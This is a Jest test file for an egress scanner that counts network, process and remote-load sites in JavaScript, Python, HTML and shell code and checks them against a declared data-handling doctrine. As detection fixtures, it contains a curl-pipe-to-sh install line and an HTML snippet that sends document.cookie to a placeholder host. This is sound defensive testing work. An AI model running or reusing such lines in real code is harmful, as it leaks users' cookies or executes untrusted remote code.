/** Every shipped network, listener and process site is declared in the data-handling doctrine. */
const {
  scanFile,
  wrapperSurface,
  requirementNames,
  validateDoctrine,
  compare,
  renderDoctrine,
  spliceDoctrine,
  verifyRepository,
} = require('../../tools/build/verify-egress');

const lines = (...rows) => rows.join('\n');

describe('egress scan — JavaScript', () => {
  it('counts each binding form, and nothing in comments, strings, regex or template text', () => {
    const source = lines(
      "const { spawn, spawnSync: run } = require('node:child_process');",
      "const http = require('http');",
      "import { request } from 'node:https';",
      "// spawn('comment') and http.get('x') in a comment",
      'const text = \'spawn("x") http.get\';',
      'const re = /spawn\\(/g;',
      'const tpl = `spawn ${spawn("inside")} http.request`;',
      "spawn('a'); run('b'); http.createServer(); request({});",
      'other.spawn(); const spawned = 1;',
      "require('node:dns').lookup('x');"
    );
    expect(scanFile('a.js', source)).toEqual({
      sites: {
        'child_process.spawn': 2,
        'child_process.spawnSync': 1,
        'http.createServer': 1,
        'https.request': 1,
        'dns.lookup': 1,
      },
      dynamic: 0,
    });
  });

  it('counts a capability handed on without a call, web globals and computed module loads', () => {
    const source = lines(
      "const cp = require('child_process');",
      'const start = cp.spawn;',
      'inject(cp);',
      "fetch('/a'); window.fetch('/b'); client.fetch('/c');",
      "require(name); import('./late.js');"
    );
    expect(scanFile('b.js', source)).toEqual({
      sites: { 'child_process.spawn': 1, child_process: 1, 'global.fetch': 2 },
      dynamic: 2,
    });
  });

  it('resolves every other way to load a module, and counts the loads it cannot resolve', () => {
    const source = lines(
      "module.require('child_process').execSync('x');",
      "process.getBuiltinModule('node:child_process').execSync('y');",
      "const { createRequire } = require('node:module');",
      "const load = createRequire(__filename); load('child_process');",
      "export { execSync } from 'node:child_process';",
      "export * from 'node:net';",
      "let cp; cp = require('child_process'); cp.spawn('a'); cp.spawn('b'); cp.exec('c');",
      "this.web = require('http'); this.web.get('u');",
      "const alias = require; eval('x'); new Function('y'); process.binding('spawn_sync');",
      'const builtin = process.getBuiltinModule;',
      "if (require.main === module) require.resolve('x');"
    );
    expect(scanFile('c.js', source)).toEqual({
      sites: {
        'child_process.execSync': 3,
        'module.createRequire': 1,
        'net.*': 1,
        'child_process.spawn': 2,
        'child_process.exec': 1,
        'http.get': 1,
      },
      dynamic: 5,
    });
  });

  it('reads a slash after an increment as division and after a condition as a regex', () => {
    const source = lines(
      "let i = 0; const x = i++ / 2; require('child_process').execSync('a'); // /",
      "if (ok) /'/.test(s); require('node:net').connect(1);",
      "const y = (a) / 2; require('node:dns').lookup('h'); // /"
    );
    expect(scanFile('d.js', source).sites).toEqual({
      'child_process.execSync': 1,
      'net.connect': 1,
      'dns.lookup': 1,
    });
  });
});

describe('egress scan — Python, markup and shell', () => {
  it('resolves import forms and ignores exceptions, constants, comments and strings', () => {
    const source = lines(
      'import subprocess',
      'import http.client',
      'import urllib.request as ur',
      'from requests.adapters import (HTTPAdapter,',
      '    DEFAULT_POOLBLOCK)',
      'from os import system, path',
      'from http import HTTPStatus',
      'import os, requests, smtplib',
      '# subprocess.run in a comment',
      'doc = """subprocess.run([\'x\'])"""',
      "subprocess.run(['a'], stdout=subprocess.PIPE)",
      'try:',
      '    pass',
      'except (subprocess.TimeoutExpired, requests.exceptions.Timeout, requests.RequestException):',
      '    pass',
      "http.client.HTTPSConnection('h')",
      "ur.urlopen('u')",
      'class Pinned(HTTPAdapter):',
      '    pass',
      "system('ls'); os.popen('x'); os.path.join('a')",
      "requests.get(rb'x'); smtplib.SMTP('h', 25); HTTPStatus.OK"
    );
    expect(scanFile('s.py', source).sites).toEqual({
      'subprocess.run': 1,
      'http.client.HTTPSConnection': 1,
      'urllib.request.urlopen': 1,
      'requests.adapters.HTTPAdapter': 1,
      'os.system': 1,
      'os.popen': 1,
      'requests.get': 1,
      'smtplib.SMTP': 1,
    });
  });

  it('turns a star import of a capability module into one whole-module site', () => {
    const source = lines(
      'from os import *',
      'from subprocess import *',
      'from os.path import *',
      "system('curl https://e'); run(['x'])"
    );
    expect(scanFile('star.py', source).sites).toEqual({ 'os.*': 1, 'subprocess.*': 1 });
  });

  it('makes everything a wrapper offers a capability at each caller, except its pure names', () => {
    const wrappers = [
      { file: 'pkg/_http.py', exports: ['api_post'], pure: ['get_key'] },
      { file: 'lib/python-provision.js', exports: ['provisionPack'], pure: ['venvPython'] },
    ];
    const python = lines(
      'from _http import api_post, get_key, resolve_host',
      'api_post("u", {})',
      'get_key("K")',
      'resolve_host("h")'
    );
    expect(scanFile('pkg/tavily.py', python, wrappers).sites).toEqual({
      '_http.api_post': 1,
      '_http.resolve_host': 1,
    });
    expect(scanFile('elsewhere/tavily.py', python, wrappers).sites).toEqual({});
    const js = lines(
      "const { installRequirements, createEnv, venvPython } = require('./python-provision');",
      "installRequirements({}); createEnv({}); venvPython('env');",
      "const again = require('../lib/python-provision').provisionPack;",
      'again({});',
      "injected.provisionPack || require('./python-provision').provisionPack;"
    );
    expect(scanFile('lib/install.js', js, wrappers).sites).toEqual({
      'python-provision.installRequirements': 1,
      'python-provision.createEnv': 1,
      'python-provision.provisionPack': 2,
    });
  });

  it('reads what a wrapper offers from module.exports or Python top-level definitions', () => {
    expect([
      ...wrapperSurface(
        'lib/runner.js',
        lines(
          'exports.extra = 1;',
          "module.exports = { runNpm, resolve: find, 'quoted': q, async start() {}, MAX_SIZE };"
        )
      ).names,
    ]).toEqual(['extra', 'runNpm', 'resolve', 'quoted', 'start']);
    expect(wrapperSurface('lib/a.js', 'module.exports = { ...base, run };').problem).toMatch(
      /not an object literal of plain names/
    );
    expect(wrapperSurface('lib/b.js', 'module.exports = createRunner();').problem).toBeDefined();
    const python = lines(
      '_NAT64 = 1',
      'session = None',
      'def fetch(url):',
      '    inner = 2',
      'async def crawl():',
      '    pass',
      'class _Pool(object):',
      '    pass',
      'class UnsafeURLError(ValueError):',
      '    pass',
      '__all__ = ["fetch"]'
    );
    expect([...wrapperSurface('s/seo_fetch.py', python).names]).toEqual([
      'fetch',
      'crawl',
      '_Pool',
      'session',
    ]);
  });

  it('counts markup, handler attributes and scripts that make a browser load a remote resource', () => {
    const html = lines(
      '<link rel="stylesheet" href="https://fonts.example/x.css">',
      '<link rel="canonical" href="https://site.example/">',
      '<a href="https://site.example/doc">doc</a>',
      '<script src="//cdn.example/x.js"></script>',
      '<script>fetch("/api"); const u = "https://not-loaded.example";</script>',
      '<style>@import url("https://fonts.example/y.css");</style>'
    );
    expect(scanFile('page.html', html).sites).toEqual({
      'markup.remote-load': 3,
      'global.fetch': 1,
    });
    const more = lines(
      '<img srcset="/a.png 1x, https://e.example/b.png 2x">',
      '<video poster="https://e.example/p.png"></video>',
      '<style>@import "https://e.example/x.css";</style>',
      '<meta http-equiv="refresh" content="0; url=https://e.example/">',
      '<button onclick="fetch(&quot;https://e.example&quot;)">x</button>',
      '<a href="javascript:navigator.sendBeacon(\'https://e.example\')">y</a>',
      '<script>const i = new Image(); i.src = "https://e.example/b?d=" + document.cookie;',
      'el.setAttribute("src", `//e.example/x.js`); a.href = "/local"; // b.src = "https://c"',
      '</script>'
    );
    expect(scanFile('more.html', more).sites).toEqual({
      'markup.remote-load': 6,
      'global.fetch': 1,
      'global.navigator.sendBeacon': 1,
    });
  });

  it('counts network tools and interpreters in shell code, substitutions and -c scripts', () => {
    const shell = lines(
      'echo "then run git pull"',
      '# curl in a comment',
      'curl -fsSL https://get.example | sh',
      'Invoke-WebRequest -Uri https://get.example',
      'cp -r skills "$HOME/.agents"'
    );
    expect(scanFile('install.sh', shell).sites).toEqual({
      'shell.curl': 1,
      'shell.sh': 1,
      'shell.invoke-webrequest': 1,
    });
    const hidden = lines(
      'out="$(curl -fsSL "https://e.example/$(uname)")"',
      "bash -c 'wget https://e.example'",
      'node -e "fetch(1)"',
      'n=${#items[@]}; git status',
      'v=`python3 --version`',
      "echo 'npm install is literal text'"
    );
    expect(scanFile('c1.sh', hidden).sites).toEqual({
      'shell.curl': 1,
      'shell.bash': 1,
      'shell.wget': 1,
      'shell.node': 1,
      'shell.git': 1,
      'shell.python3': 1,
    });
    const powershell = lines(
      '& $tool --flag',
      '& python x.py',
      '$python = Get-Command python',
      'powershell -Command "Invoke-WebRequest https://e.example"',
      '<# curl in a block comment #>',
      '$text = @"',
      'curl inside a here-string, $(git rev-parse HEAD)',
      '"@',
      'Write-Host "Run: npx bmad-method install"',
      'cmd /c dir 2>&1'
    );
    expect(scanFile('install.ps1', powershell).sites).toEqual({
      'shell.call': 1,
      'shell.python': 2,
      'shell.powershell': 1,
      'shell.invoke-webrequest': 1,
      'shell.git': 1,
      'shell.cmd': 1,
    });
  });
});

describe('data-handling doctrine', () => {
  const doctrine = () => ({
    runtime_dependencies: ['js-yaml'],
    wrappers: [
      {
        file: 'lib/npm-runner.js',
        exports: ['runNpm'],
        pure: ['resolveNpmCli'],
        sites: { 'child_process.spawn': 1 },
      },
    ],
    dynamic_loads: [{ file: 'cli.js', count: 1, loads: 'command modules' }],
    services: [
      {
        id: 'bridge',
        root: 'bridge',
        purpose: 'A maintainer service.',
        requirements: 'bridge/requirements.txt',
        dependencies: ['requests', 'PyYAML'],
        exclude: ['**/test_*.py'],
      },
    ],
    flows: [
      {
        id: 'update-check',
        component: 'cli',
        egress: 'delegated',
        purpose: 'Asks npm for the latest release.',
        sends: 'The package name.',
        recipients: ['registry.npmjs.org'],
        trigger: 'update-check',
        consent: { basis: 'opt-out', how: 'update-policy --mode off' },
        sites: { 'lib/check.js': { 'npm-runner.runNpm': 1 } },
      },
      {
        id: 'uat-serve',
        component: 'core',
        egress: 'none',
        purpose: 'Serves a page on loopback.',
        trigger: 'uat serve',
        sites: { 'serve.js': { 'http.createServer': 1 } },
      },
      {
        id: 'bridge-call',
        component: 'bridge',
        egress: 'direct',
        purpose: 'Calls the server.',
        sends: 'Tool calls.',
        recipients: ['the server'],
        trigger: 'When called.',
        consent: { basis: 'credential', how: 'A token.' },
        sites: { 'bridge/client.py': { 'requests.post': 1 } },
      },
    ],
  });
  const context = { packs: ['core', 'osint'], dependencies: ['js-yaml'] };
  const sources = () => ({
    'lib/npm-runner.js': lines(
      "const cp = require('node:child_process');",
      "function runNpm() { return cp.spawn('npm'); }",
      'function resolveNpmCli() {}',
      'module.exports = { runNpm, resolveNpmCli };'
    ),
    'lib/check.js': lines(
      "const { runNpm, resolveNpmCli } = require('./npm-runner');",
      'resolveNpmCli(); runNpm();'
    ),
    'serve.js': lines("const http = require('node:http');", 'http.createServer();'),
    'cli.js': 'require(modulePath);',
    'bridge/client.py': lines('import requests', "requests.post('u')"),
  });
  const requirements = { 'bridge/requirements.txt': 'requests==2.34.2\npyyaml==6.0.3 # config\n' };

  it('accepts a doctrine that matches the code', () => {
    expect(validateDoctrine(doctrine(), context)).toEqual([]);
    expect(compare(doctrine(), sources(), { requirements }).problems).toEqual([]);
  });

  it('refuses a malformed doctrine', () => {
    const bad = doctrine();
    bad.extra = true;
    bad.runtime_dependencies = [];
    bad.flows[0].egress = 'sometimes';
    bad.flows[0].component = 'nowhere';
    bad.flows[1].consent = { basis: 'invocation', how: 'never needed' };
    bad.flows.push({ ...doctrine().flows[0], recipients: [], consent: { basis: 'maybe' } });
    bad.wrappers[0].pure.push('runNpm');
    bad.services.push({ id: 'core', root: 'x', purpose: 'p', dependencies: 'requests' });
    const problems = validateDoctrine(bad, context).join('\n');
    expect(problems).toMatch(/unknown key "extra"/);
    expect(problems).toMatch(
      /runtime_dependencies: \[\] differs from package.json dependencies \[js-yaml\]/
    );
    expect(problems).toMatch(/egress must be one of none, direct, delegated/);
    expect(problems).toMatch(
      /component "nowhere" is neither cli, a registry pack nor a declared service/
    );
    expect(problems).toMatch(/"uat-serve": a local flow declares no sends, recipients or consent/);
    expect(problems).toMatch(/duplicate id/);
    expect(problems).toMatch(/recipients must name who receives it/);
    expect(problems).toMatch(/consent needs a basis/);
    expect(problems).toMatch(/"runNpm" is listed both as an export and as pure/);
    expect(problems).toMatch(/services\[1\]: id "core" is taken/);
    expect(problems).toMatch(/services\[1\]: root, purpose and requirements are required/);
    expect(problems).toMatch(/services\[1\]: dependencies must list the requirements by name/);
  });

  it('fails on an undeclared, miscounted, stale or doubly claimed site', () => {
    const code = sources();
    code['lib/check.js'] += '\nrunNpm();';
    code['extra.js'] = "require('node:net').connect(80);";
    delete code['serve.js'];
    code['other.js'] = 'const load = require;';
    const declared = doctrine();
    declared.flows.push({ ...declared.flows[1], id: 'again' });
    const problems = compare(declared, code).problems.join('\n');
    expect(problems).toMatch(
      /lib\/check\.js: npm-runner\.runNpm — flow "update-check" declares 1, the code holds 2/
    );
    expect(problems).toMatch(/extra\.js: net\.connect ×1 is not declared/);
    expect(problems).toMatch(
      /serve\.js: http\.createServer — declared by flow "uat-serve", no longer in the shipped code/
    );
    expect(problems).toMatch(
      /serve\.js: http\.createServer is claimed by flow "uat-serve" and flow "again"/
    );
    expect(problems).toMatch(/other\.js: 1 module load\(s\) the scan cannot resolve/);
  });

  it('fails on a wrapper without a caller flow, or whose names are not all listed', () => {
    const declared = doctrine();
    declared.wrappers[0].exports.push('createRunner');
    declared.wrappers[0].pure = [];
    declared.flows.shift();
    const code = sources();
    delete code['lib/check.js'];
    code['lib/npm-runner.js'] += '\nexports.installRequirements = () => cp.spawn("pip");';
    const problems = compare(declared, code).problems.join('\n');
    expect(problems).toMatch(/lib\/npm-runner\.js: no flow declares a caller of this wrapper/);
    expect(problems).toMatch(/wrapper lists "createRunner", which it does not offer/);
    expect(problems).toMatch(/offers "resolveNpmCli", listed neither in exports nor as pure/);
    expect(problems).toMatch(/offers "installRequirements", listed neither in exports nor as pure/);
    expect(problems).not.toMatch(/"runNpm"/);
    code['lib/npm-runner.js'] = 'module.exports = makeRunner();';
    expect(compare(declared, code).problems.join('\n')).toMatch(
      /lib\/npm-runner\.js: module\.exports is not an object literal of plain names/
    );
  });

  it('keeps service flows on service files and service dependencies on requirements.txt', () => {
    const declared = doctrine();
    declared.flows[2].sites['serve.js'] = { 'http.createServer': 1 };
    delete declared.flows[1].sites['serve.js'];
    declared.flows[1].sites['bridge/client.py'] = { 'requests.post': 1 };
    delete declared.flows[2].sites['bridge/client.py'];
    const problems = compare(declared, sources(), {
      requirements: { 'bridge/requirements.txt': 'requests==2.34.2\ngoogle-genai==2.0\n' },
    }).problems.join('\n');
    expect(problems).toMatch(
      /serve\.js: flow "bridge-call" \(bridge\) names a file of the npm payload/
    );
    expect(problems).toMatch(
      /bridge\/client\.py: flow "uat-serve" \(core\) names a file of bridge/
    );
    expect(problems).toMatch(
      /services "bridge" dependencies: \[pyyaml, requests\] differs from bridge\/requirements\.txt \[google-genai, requests\]/
    );
    expect(
      requirementNames('# pins\nPyYAML==6.0 ; python_version>"3"\n-r base.txt\nzope.interface>=5\n')
    ).toEqual(['pyyaml', 'zope-interface']);
  });

  it('renders the flows between the SECURITY.md markers and refuses a document without them', () => {
    const block = renderDoctrine(doctrine());
    expect(block).toMatch(
      /\| `update-check` \| cli \| through a started program \| The package name\. \| registry\.npmjs\.org \| update-check \| \*\*opt-out\*\*: update-policy --mode off \|/
    );
    expect(block).toMatch(/- `uat-serve` \(core\): Serves a page on loopback\. When: uat serve/);
    expect(block).toMatch(
      /not part of the npm package:\n\n- `bridge` \(`bridge\/`\): A maintainer service\.\n\n\| Flow \| Service \|/
    );
    expect(block).toMatch(/\| `bridge-call` \| bridge \| directly \| Tool calls\. \|/);
    expect(block.indexOf('bridge-call')).toBeGreaterThan(block.indexOf('uat-serve'));
    const [begin, end] = [block.split('\n')[0], block.split('\n').at(-1)];
    const document = `# Security\n\n${begin}\nstale\n${end}\n\nAfter.\n`;
    expect(spliceDoctrine(document, block)).toBe(`# Security\n\n${block}\n\nAfter.\n`);
    expect(() => spliceDoctrine('# Security\n', block)).toThrow(/no data-handling block markers/);
  });

  it('passes on this repository, services and SECURITY.md included', () => {
    const result = verifyRepository();
    expect(result.problems).toEqual([]);
    expect(result.flows).toBeGreaterThan(20);
    expect(result.observed.some((site) => site.file.startsWith('mcp-server/'))).toBe(true);
    expect(result.observed.some((site) => site.file.startsWith('monitor/'))).toBe(true);
  });
});
